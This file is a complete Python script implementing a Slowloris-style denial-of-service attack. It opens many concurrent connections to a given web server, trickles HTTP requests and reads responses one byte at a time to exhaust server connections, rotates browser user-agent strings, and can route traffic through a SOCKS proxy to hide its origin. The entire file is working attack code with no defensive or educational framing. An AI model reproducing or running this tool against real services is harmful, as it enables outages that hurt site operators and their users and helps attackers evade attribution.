from python_socks.async_.asyncio import Proxy
import argparse
import asyncio
import functools
import random
import re
import ssl
import time
import urllib.parse

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3',
]

DEFAULT_HEADERS = {
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Upgrade-Insecure-Requests': '1',
}

parser = argparse.ArgumentParser()
parser.add_argument('url')
parser.add_argument('-H', '--header', action='append', default=[], help='add custom header')
parser.add_argument('--workers', type=int, default=8, help='default: %(default)s')
parser.add_argument('--interval', type=float, default=1, metavar='SECONDS', help='interval between requests default: %(default)s')
parser.add_argument('--timeout', type=float, default=15, metavar='SECONDS', help='default: %(default)s')
parser.add_argument('--read-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second default: %(default)s')
parser.add_argument('--write-rate', type=float, default=0.05, metavar='SECONDS', help='bytes/second default: %(default)s')
parser.add_argument('-x', '--proxy')
args = parser.parse_args()

url = urllib.parse.urlparse(args.url)
if url.scheme not in ['', 'http', 'https']:
    print(f'Invalid http scheme {url.scheme}')
    exit(1)

if not re.match(r"https?://.*", args.url):
    args.url = 'http://' + args.url

url = urllib.parse.urlparse(args.url)
hostname = url.hostname
port = url.port
https = url.scheme == 'https'

if port is None:
    if url.scheme == 'http':
        port = 80
    else:
        port = 443

def slowloris_timeout(timeout):
    def decorate(func):
        @functools.wraps(func)
        async def wrapper(*args, **kwargs):
            async with asyncio.timeout(timeout):
                return await func(*args, **kwargs)
        return wrapper
    return decorate

@slowloris_timeout(args.timeout)
async def slowloris_write(writer, data, rate):
    for char in data:
        writer.write(char.encode())
        await writer.drain()
        await asyncio.sleep(rate)

@slowloris_timeout(args.timeout)
async def slowloris_read(reader, rate, n=-1):
    data = b""
    while True:
        d = await reader.read(1)
        if len(d) == 0:
            return data
        n -= 1
        data += d
        if n == 0:
            return data
        await asyncio.sleep(rate)

@slowloris_timeout(args.timeout)
async def slowloris_readuntil(reader, sep, rate):
    data = b''
    while True:
        if data.endswith(sep):
            return data
        d = await reader.read(1)
        if len(d) == 0:
            return data
        data += d
        await asyncio.sleep(rate)

@slowloris_timeout(args.timeout)
async def slowloris_open(host, port, https, proxy):
    ssl_ctx = None
    if https:
        ssl_ctx = ssl.create_default_context()

    if proxy is None:
        return await asyncio.open_connection(host, port, ssl=ssl_ctx)

    proxy = Proxy.from_url(proxy)
    sock = await proxy.connect(dest_host=host, dest_port=port)
    return await asyncio.open_connection(host=None, port=None, sock=sock, ssl=ssl_ctx, server_hostname=host if https else None)

async def slowloris_attack_loop(*args, **kwargs):
    while True:
        try:
            await slowloris_attack(*args, **kwargs)
        except Exception as e:
            if len(str(e).strip()) != 0:
                print(f'{e.__class__.__name__}: {e}')
            else:
                print(f'{e.__class__.__name__}')

async def slowloris_attack(host, port, read_rate, write_rate, https, path, headers_list, proxy, interval):
    reader, writer = await slowloris_open(host, port, https, proxy)
    headers = DEFAULT_HEADERS
    headers['Host'] = host
    headers['User-Agent'] = random.choice(USER_AGENTS)

    for h in headers_list:
        data = h.split(':')
        headers[data[0].strip()] = (':'.join(data[1:])).strip()

    headers['Connection'] = 'keep-alive'

    if path is None or len(path) == 0:
        path = '/'

    while True:

        time_write_start = time.time()

        await slowloris_write(writer, f'GET {path} HTTP/1.1\r\n', write_rate)

        for k,v in headers.items():
            await slowloris_write(writer, f'{k}: {v}\r\n', write_rate)

        await slowloris_write(writer, '\r\n', write_rate)

        print(f'Sent http request in {time.time()-time_write_start} seconds')

        time_read_start = time.time()

        response_headers = await slowloris_readuntil(reader, b'\r\n\r\n', read_rate)
        if len(response_headers) == 0:
            writer.close()
            raise Exception('Could not get response headers')

        response_headers = response_headers.strip().split(b'\r\n')
        length = 0
        for rh in response_headers:
            if rh.lower().strip().startswith(b'content-length'):
                length = int(rh.split(b':')[-1].strip())

        if length > 0:
            await slowloris_read(reader, read_rate, n=length)

        print(f'Got http response in {time.time()-time_read_start} seconds')

        await asyncio.sleep(args.interval)

async def run(workers, *args, **kwargs):
    await asyncio.gather(*[slowloris_attack_loop(*args, **kwargs) for i in range(workers)])

asyncio.run(run(
    args.workers,
    hostname,
    port,
    args.read_rate,
    args.write_rate,
    https=https,
    path=url.path,
    headers_list=args.header,
    proxy=args.proxy,
    interval=args.interval,
))
